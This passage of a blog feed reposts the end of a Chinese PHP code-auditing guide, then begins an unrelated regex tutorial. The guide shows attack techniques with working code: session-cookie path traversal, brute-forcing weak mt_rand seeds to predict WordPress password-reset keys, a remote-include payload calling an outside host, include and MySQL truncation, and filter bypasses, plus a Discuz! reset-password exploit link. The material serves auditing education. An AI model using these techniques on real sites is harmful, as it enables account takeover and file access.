class="keyword">echo</span>(session_id());</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们提交构造cookie:PHPSESSID=/…/1.php，相当于unlink(‘sess<code>_</code>/…/1.php’)这样就通过注射…/转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：具体不详<br>系统要求：无<br>审计策略：查找session_destroy </td></tr></tbody></table><h4 id="随机函数"><a class="header-anchor" href="#随机函数">null</a>随机函数</h4><p><strong>1) rand() VS mt_rand()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//on windows</span></span><br><span class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></span><br><span class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= md5(rand());</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">32767</span>;$i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(md5($i) ==$a ) &#123;</span><br><span class="line">   <span class="keyword">print</span> $i.<span class="string">"--&gt;ok!!&lt;br&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123; <span class="keyword">print</span> $i.<span class="string">"&lt;br&gt;"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找rand </td></tr></tbody></table><p><strong>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</strong></p><p>看php手册里的描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mt_srand</span><br><span class="line">(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)</span><br><span class="line"></span><br><span class="line">mt_srand -- 播下一个更好的随机数发生器种子</span><br><span class="line">说明</span><br><span class="line">void mt_srand ( int seed )</span><br></pre></td></tr></table></figure><p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。</p><p>例子 1. mt_srand() 范例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// seed with microseconds</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(make_seed());</span><br><span class="line">$randval = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。</em></p><p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand ((double) microtime() * 1000000)</span><br></pre></td></tr></table></figure><p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 1000000&lt;1000000</span><br></pre></td></tr></table></figure><p>那么很容易暴力破解,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"><span class="comment">//&gt;php rand.php</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">////////////////</span></span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</span><br><span class="line">$time=(double) microtime()* <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</span><br><span class="line">mt_srand ($time);</span><br><span class="line"></span><br><span class="line">$search_id = mt_rand();</span><br><span class="line">$seed = search_seed($search_id);</span><br><span class="line"><span class="keyword">print</span> $seed;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</span><br><span class="line">$max = <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$key = mt_rand();</span><br><span class="line"><span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p><table><thead><tr><th style="text-align:left"><strong>seed-A</strong></th></tr></thead><tbody><tr><td style="text-align:left">mt_rand-A-1<br>mt_rand-A-2<br>mt_rand-A-3 </td></tr></tbody></table><table><thead><tr><th style="text-align:left"><strong>seed-B</strong></th></tr></thead><tbody><tr><td style="text-align:left">mt_rand-B-1<br>mt_rand-B-2<br>mt_rand-B-3 </td></tr></tbody></table><p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p><p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p><p>第一种：‘Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p><p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：</p><blockquote><p>The Implementation<br>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p></blockquote><p>在32位系统上默认的播种的种子为最大值是<code>2<sup>32&lt;/code&gt;，这样我们循环最多&lt;code&gt;2</sup>32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录<a href="3.md">3</a>）,测试代码如下：<br><br><br></p><pre><code>&lt;?php<br>mt_srand(4); <br>$a = mt_rand(); <br>mt_srand(5); <br>$b = mt_rand();<br>print $a."\n".$b;<br>?&gt;<br></code></pre><p>通过上面的代码发现$a==$b，所以我们循环的次数为2<sup>32/2=2</sup>31次。我们看如下代码：<br><br><br></p><pre><code>&lt;?php<br>//base on http://www.milw0rm.com/exploits/6421 <br>//test on php 5.2.0<br><br>define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1<br><br>$key = wp_generate_password(20, false);<br>echo $key."\n";<br>$seed = getseed($key);<br>print $seed."\n"; <br><br>mt_srand($seed);<br>$pass = wp_generate_password(20, false);<br>echo $pass."\n";<br><br>function wp_generate_password($length = 12, $special_chars = true) {<br>$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';<br>if ( $special_chars )<br>$chars .= '!@#$%^&amp;*()';<br><br>$password = '';<br>for ( $i = 0; $i &lt; $length; $i++ )<br>$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);<br>return $password;<br>} <br><br>function getseed($resetkey) {<br>$max = pow(2,(32-BUGGY));<br>for($x=0;$x&lt;=$max;$x++) {<br>$seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; <br>mt_srand($seed);<br>$testkey = wp_generate_password(20,false);<br>if($testkey==$resetkey) { echo "o\n"; return $seed; }<br><br>if(!($x % 10000)) echo $x / 10000;<br>}<br>echo "\n";<br>return false;<br>}<br>?&gt;<br></code></pre><p>运行结果如下：<br><br><br></p><pre><code>php5&gt;php rand.php<br>M8pzpjwCrvVt3oobAaOr<br>0123456789101112131415161718192021222324252627282930313233343536373839404142434<br>445464748495051525354555657585960616263646566676869<br>7071727374757677787980818283848586878889909192939495969798991001011021031041051<br>061071081091101111121131141151161171181191201211221<br>2312412512612712812913013113213313413513613713813914014114214314414514614714814<br>915015115215315415515615715815916016116216316416516<br>6167168169170171172173174175176177178179180181182183184185186187188189190191192<br>193194195196197198199200201202203204205206207208209<br>2102112122132142152162172182192202212222232242252262272282292302312322332342352<br>362372382392402412422432442452462472482492502512522<br>..............01062110622106231062410625106261062710628106291063010631106321063<br>3o<br>70693<br>pjwCrvVt3oobAaOr<br></code></pre><p>当10634次时候我们得到了结果。<br><br><br><br>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：<br><br><br></p><pre><code>&lt;?php<br>mt_srand(42);<br>echo mt_rand();<br>//php&lt;=5.20 1387371436<br>//php&gt;5.20 1354439493 <br>?&gt;<br></code></pre><p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。<br><br><br><br>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。<br><br><br><br>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）<br><br><br></p><table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody><tr><td> PHP版本要求：php4 php5<5.2.6<br>系统要求：无<br>审计策略：查找mt_srand/mt_rand </5.2.6<br></td></tr></tbody></table><p></p><h3>特殊字符</h3><p></p><p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：<br><br><br></p><p></p><h4>截断</h4><p></p><p>其中最有名的数大家都熟悉的null字符截断。<br><br><br></p><p></p><h5>include截断</h5><p></p><pre><code>&lt;?php <br>include $_GET['action'].".php"; <br>?&gt;<br></code></pre><p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code><a href="http://www.hacksite.com/evil-code.txt" target="_blank" rel="noopener">http://www.hacksite.com/evil-code.txt</a></code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：<br><br><br></p><pre><code>&lt;?php<br>////////////////////<br>////var5.php代码:<br>////include $_GET['action'].".php"; <br>////print strlen(realpath("./"))+strlen($_GET['action']);  <br>///////////////////<br>ini_set('max_execution_time', 0);<br>$str='';<br>for($i=0;$i&lt;50000;$i++)<br>{<br>$str=$str."/";<br><br>$resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);<br>//1.txt里的代码为print 'hi';<br>if (strpos($resp, 'hi') !== false){<br>print $i;<br>exit;<br>}<br>}<br>?&gt;<br></code></pre><p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code><em></em></code>nix的系统长度不一样，当win下strlen(realpath(&quot;./&quot;))+strlen($<code>_</code>GET<code>[‘action’]</code>)的长度大于256时被截断，对于<code></code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）<br><br><br></p><p></p><h5>数据截断</h5><p></p><p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。<br><br><br><br><b>1) Mysql SQL Column Truncation Vulnerabilities</b></p><p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br><br><br></p><pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");<br><br>mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");<br>Query OK, 1 row affected, 1 warning (0.01 sec)<br><br>mysql&gt; select * from truncated_test;<br>+----+------------+----------+<br>| id | username   | password |<br>+----+------------+----------+<br>| 1 | admin      | pass     |<br>| 2 | admin      | new_pass |<br>+----+------------+----------+<br>2 rows in set (0.00 sec)<br></code></pre><p><b>2) Mysql charset Truncation vulnerability</b></p><p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br><br><br></p><pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");<br>Query OK, 1 row affected, 1 warning (0.00 sec)<br><br>mysql&gt; select * from truncated_test;<br>+----+------------+----------+<br>| id | username   | password |<br>+----+------------+----------+<br>| 1 | admin      | pass      |<br>| 2 | admin      | new_pass  |<br>| 3 | admin      | new_pass2 |<br>+----+------------+----------+<br>2 rows in set (0.00 sec)<br></code></pre><p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：<br><br><br></p><pre><code>$result = mysql_query("SELECT * from test_user where user='$user' ");<br>  ....<br>if(@mysql_fetch_array($result, MYSQL_NUM)) {<br>die("already exist");<br>}<br></code></pre><table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody><tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><p></p><h5>文件操作里的特殊字符</h5><p></p><p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“…\”进行系统转跳等等。<br><br><br><br>下面还给大家介绍一个非常有意思的问题：<br><br><br></p><pre><code>//Is this code vul?<br>if( eregi(".php",$url) ){<br>die("ERR");<br>}<br>$fileurl=str_replace($webdb[www_url],"",$url);<br>.....<br>header('Content-Disposition: attachment; filename='.$filename);<br></code></pre><p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb<a href="www_url.md">www_url</a>为空，那么我们提交“.p$webdb<a href="www_url.md">www_url</a>hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：<br><br><br></p><pre><code>$fileurl=str_replace($webdb[www_url],"",$url);<br>if( eregi(".php",$url) ){<br>die("ERR");<br>}<br></code></pre><p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：<br><br><br></p><pre><code>&lt;?php<br>for($i=0;$i&lt;255;$i++) {<br>$url = '1.ph'.chr($i);<br>$tmp = @file_get_contents($url);<br>if(!empty($tmp)) echo chr($i)."\r\n";<br>}  <br>?&gt;<br></code></pre><p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。<br><br><br></p><table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody><tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：文读取件操作函数 </td></tr></tbody></table><p></p><h2>怎么进一步寻找新的字典</h2><p></p><p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？<br><br><br></p><ul><li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典<br></li><li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式<br></li><li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来<br></li><li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）<br></li><li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题<br></li><li>你有什么要补充的吗？ ：）</li></ul><p></p><h2>DEMO</h2><p></p><table><thead><th> <b>DEMO -- Discuz! Reset User Password 0day Vulnerability 分析</b><br>（Exp:<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt" target="_blank" rel="noopener">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt</a>）</th></thead><tbody><tr><td> PHP版本要求:php4 php5<5.2.6<br>系统要求: 无<br>审计策略:查找mt_srand/mt_rand </5.2.6<br></td></tr></tbody></table><p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：<br><br><br></p><pre><code>heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5<br>./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);<br>./include/global.func.php-695-  return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';<br>./include/global.func.php-696-}<br>./include/global.func.php-697-<br>./include/global.func.php-698-function random($length, $numeric = 0) {<br>./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br>./include/global.func.php-700-  if($numeric) {<br>./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));<br>./include/global.func.php-702-  } else {<br>./include/global.func.php-703-          $hash = '';<br>./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';<br>--<br>./include/discuzcode.func.php-30-<br>./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || !is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {<br>./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';<br>./include/discuzcode.func.php-33-}<br>./include/discuzcode.func.php-34-<br>./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br>./include/discuzcode.func.php-36-<br>./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) {<br>./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;<br>./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];<br>./include/discuzcode.func.php-40-       if($attach['attachimg']) {<br></code></pre><p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：<br><br><br></p><pre><code> PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br></code></pre><p>判断了版本，如果是PHP_VERSION &gt; '4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：<br><br><br></p><ol><li>‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件：<br><br><br></li></ol><pre><code>./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br></code></pre><p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）<br><br><br></p><ol start="2"><li>有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。<br><br><br><br><br></li></ol><p></p><h2>后话</h2><p></p><p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！<br><br><br><br><br></p><p></p><h2>附录</h2><p></p><p><code>[</code>1<code>]</code> <a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="noopener">http://bbs.phpchina.com/attachment.php?aid=22294</a><br><code>[</code>2<code>]</code> <a href="http://www.php-security.org/" target="_blank" rel="noopener">http://www.php-security.org/</a><br><code>[</code>3<code>]</code> <a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="noopener">http://bugs.php.net/bug.php?id=40114</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;高级PHP应用程序漏洞审核技术（转载）&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;前言&lt;/li&gt;
&lt;li&gt;传统的代码审计技术&lt;/li&gt;
&lt;li&gt;PHP版本与应用代码审计&lt;/li&gt;
&lt;li&gt;其他的因素与应用代码审计&lt;/li&gt;
&lt;li&gt;扩展我们的字典
&lt;ul&gt;
&lt;li&gt;变量本身的key&lt;/
      
    
    </summary>
    
      <category term="web入门" scheme="https://13m0nade.github.io/categories/web%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="php代码审计" scheme="https://13m0nade.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅识正则表达式</title>
    <link href="https://13m0nade.github.io/2019/07/30/%E6%B5%85%E8%AF%86%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://13m0nade.github.io/2019/07/30/浅识正则表达式/</id>
    <published>2019-07-30T06:53:17.000Z</published>
    <updated>2019-08-01T12:05:47.817Z</updated>
    
    <content type="html"><![CDATA[<h1>元字符</h1><table><thead><tr><th style="text-align:center">代码/语法</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">.</td><td style="text-align:center">匹配除换行符以外的任意字符</td></tr><tr><td style="text-align:center">\w</td><td style="text-align:center">匹配字母或数字或下划线或汉字</td></tr><tr><td style="text-align:center">\s</td><td style="text-align:center">匹配任意的空白符</td></tr><tr><td style="text-align:center">\d</td><td style="text-align:center">匹配数字</td></tr><tr><td style="text-align:center">\b</td><td style="text-align:center">匹配单词的开始或结束</td></tr><tr><td style="text-align:center">^</td><td style="text-align:center">匹配字符串的开始</td></tr><tr><td style="text-align:center">$</td><td style="text-align:center">匹配字符串的结束</td></tr></tbody></table><p>示例：\ba\w*\b  匹配以字母a开头的单词——先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w*)，最后是单词结束处(\b)。(* 匹配零次或任意次，后面会讲)</p><h1>字符转义</h1><p>如果你想查找元字符本身的话，比如你查找.,或者*,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用\来取消这些字符的特殊意义。因此，你应该使用.和*。当然，要查找\本身，你也得用\.</p><p>示例：<a href="http://deerchao.xn--netdeerchao-1p1se075d.net" target="_blank" rel="noopener">deerchao.net匹配deerchao.net</a>，C:\Windows匹配C:\Windows。</p><h1>重复</h1><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">+</td><td style="text-align:center">重复一次或更多次</td></tr><tr><td style="text-align:center">?</td><td style="text-align:center">重复零次或一次</td></tr><tr><td style="text-align:center">{n}</td><td style="text-align:center">重复n次</td></tr><tr><td style="text-align:center">{n,}</td><td style="text-align:center">重复n次或更多次</td></tr><tr><td style="text-align:center">{n,m}</td><td style="text-align:center">重复n到m次</td></tr><tr><td style="text-align:center">*</td><td style="text-align:center">重复零次或更多次</td></tr></tbody></table><p>示例：一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\d{5,12}$</p><h1>字符类</h1><p>如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u)，只需要在方括号里列出它们就行了，像[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号(.或?或!)。</p><p>示例：(?0\d{2}[) -]?\d{8}</p><p>这个表达式可以匹配几种格式的电话号码，像*(010)88886666*，或<em>022-22334455</em>，或<em>02912345678</em>等。我们对它进行一些分析吧：首先是一个转义字符(,它能出现0次或1次(?),然后是一个0，后面跟着2个数字(\d{2})，然后是)或-或空格中的一个，它出现1次或不出现(?)，最后是8个数字(\d{8})。（“(”和“)”也是元字符，所以在这里需要转义）</p><h1>分支条件</h1><p>正则表达式里的<strong>分枝条件</strong>指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。</p><p>示例：0\d{2}-\d{8}|0\d{3}-\d{7}这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如010-12345678)，一种是4位区号，7位本地号(0376-2233445)。</p><h1>分组</h1><p>如果想要重复多个字符，你可以用小括号来指定<strong>子表达式</strong>(也叫做<strong>分组</strong>)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p><p>示例：((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)  可以用来匹配ip地址（ip地址取值只能在0-255，使用分支来列出三种情况，中间&quot;.&quot;用分组解决。</p><h1>反义</h1><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">\W</td><td style="text-align:center">匹配任意不是字母，数字，下划线，汉字的字符</td></tr><tr><td style="text-align:center">\S</td><td style="text-align:center">匹配任意不是空白符的字符</td></tr><tr><td style="text-align:center">\D</td><td style="text-align:center">匹配任意非数字的字符</td></tr><tr><td style="text-align:center">\B</td><td style="text-align:center">匹配不是单词开头或结束的位置</td></tr><tr><td style="text-align:center">[^X]</td><td style="text-align:center">匹配除了x以外的任意字符</td></tr><tr><td style="text-align:center">[^aeiou]</td><td style="text-align:center">匹配除了aeiou这几个字母以外的任意字符</td></tr></tbody></table><p>示例：\S+  匹配不包含空白符的字符串</p><h1>后向引用</h1><p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式的文本</strong>(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个<strong>组号</strong>，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。<strong>后向引用</strong>用于重复搜索前面某个分组匹配的文本。</p><p>示例：\b(\w+)\b\s+\1\b可以用来匹配重复的单词，像<em>go go</em>, 或者<em>kitty 